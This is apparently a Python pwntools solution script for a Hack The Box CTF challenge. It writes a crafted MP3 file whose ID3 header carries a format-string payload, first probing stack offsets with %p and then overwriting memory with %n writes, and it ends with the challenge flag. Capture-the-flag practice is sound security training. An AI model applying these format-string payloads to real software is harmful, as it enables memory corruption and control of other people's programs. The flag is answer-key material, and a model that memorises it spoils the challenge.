from pwn import *
import subprocess

#detect
'''
for i in range(1,32):
	buf = b'ID3'
	buf += b'ABCDEFGH.%'+str(i).encode()+b'$p'
	with open('/tmp/test.mp3', 'wb') as f:
		f.write(buf)
	output = subprocess.check_output("./main", shell=True)
	print(str(i)+': '+output.decode("utf-8"))
'''

#9 -> 0xdead1337 -> 0xbeef
#10 -> 0x1337beef -> 0xc0de

#Refer to htb/ctf/pwn/SpacepirateEntrypoint/dec.py
'''
for i in range(10,32,1):
	try:
		print(i,i+1)
		buf = b'ID3'
		#buf += b'%9$p.%10$p'
		buf += b'%48879c%'+str(i).encode()+b'$n%495c%'+str(i+1).encode()+b'$n'
		with open('/tmp/test.mp3', 'wb') as f:
			f.write(buf)
		output = subprocess.check_output("./main", shell=True)
		print(output.decode("utf-8"))
	except:
		pass
'''
#12, 13
buf = b'ID3'
buf += b'%48879c%12$n%495c%13$n'
with open('/tmp/test.mp3', 'wb') as f:
	f.write(buf)
output = subprocess.check_output("./main", shell=True)
print(output.decode("utf-8"))

#Uploade /tmp/test.mp3 to HTB docker
#HTB{mp3_f1l35_fr0m_l1m3_w1r3_xD}
